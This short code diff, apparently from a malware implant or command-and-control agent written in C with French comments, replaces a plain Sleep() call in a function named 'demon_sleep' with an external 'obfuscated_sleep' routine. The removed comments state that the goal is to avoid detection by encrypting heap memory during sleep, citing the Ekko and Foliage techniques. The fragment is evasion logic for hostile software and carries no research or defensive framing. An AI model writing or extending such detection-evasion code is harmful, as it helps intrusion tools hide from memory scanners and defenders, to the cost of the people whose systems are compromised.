@@ -74,17 +74,10 @@ static bool security_checks(void) {
   return true;
 }
 
-/*
- * Dort pendant la durée spécifiée.
- * Utilise une technique d'obfuscation pour pas être détecté.
- */
+// sleep avec obfuscation memoire (chiffre heap pendant le sleep)
 static void demon_sleep(DWORD ms) {
-  /*
-   * Pour l'instant on utilise un Sleep() classique.
-   * TODO: Implémenter le sleep obfuscation (Ekko/Foliage)
-   * qui chiffre la mémoire pendant le sleep.
-   */
-  Sleep(ms);
+  extern void obfuscated_sleep(DWORD ms);
+  obfuscated_sleep(ms);
 }
 
 /* Public API */
